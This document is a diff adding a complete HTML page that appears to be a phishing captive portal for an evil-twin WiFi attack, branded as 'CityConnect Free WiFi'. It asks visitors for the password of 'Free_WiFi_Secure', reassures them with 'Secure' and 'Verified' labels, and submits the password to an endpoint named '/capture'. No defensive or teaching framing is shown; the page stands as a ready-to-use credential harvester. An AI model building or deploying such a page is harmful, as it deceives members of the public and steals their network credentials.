@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free WiFi Access - CityConnect</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: rgba(255,255,255,0.15);
+            backdrop-filter: blur(10px);
+            padding: 20px 40px;
+            display: flex;
+            align-items: center;
+            color: white;
+        }
+        
+        .header span { font-size: 24px; font-weight: 700; margin-left: 12px; }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 25px 100px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        
+        .wifi-icon { font-size: 60px; margin-bottom: 20px; }
+        
+        h1 { font-size: 24px; color: #1a1a2e; margin-bottom: 10px; }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
+        
+        .network {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            text-align: left;
+        }
+        
+        .network-signal { margin-left: auto; color: #28a745; }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        input:focus { outline: none; border-color: #667eea; }
+        
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 1px solid #e0e0e0;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .footer {
+            background: rgba(0,0,0,0.2);
+            color: rgba(255,255,255,0.7);
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <span>📶</span>
+        <span>CityConnect Free WiFi</span>
+    </header>
+    
+    <div class="container">
+        <div class="card">
+            <div class="wifi-icon">📡</div>
+            <h1>Connect to WiFi</h1>
+            <p class="subtitle">Enter password for:</p>
+            
+            <div class="network">
+                <span>🔒</span>
+                <strong>Free_WiFi_Secure</strong>
+                <span class="network-signal">📶 Excellent</span>
+            </div>
+            
+            <form action="/capture" method="POST">
+                <input type="text" name="network_name" placeholder="Network Name" value="Free_WiFi_Secure">
+                <input type="password" name="wifi_password" placeholder="WiFi Password" required>
+                <button type="submit">Connect Now</button>
+            </form>
+            
+            <div class="features">
+                <span>🔒 Secure</span>
+                <span>⚡ High Speed</span>
+                <span>✓ Verified</span>
+            </div>
+        </div>
+    </div>
+    
+    <footer>© 2026 CityConnect Public WiFi Network</footer>
+</body>
+</html>
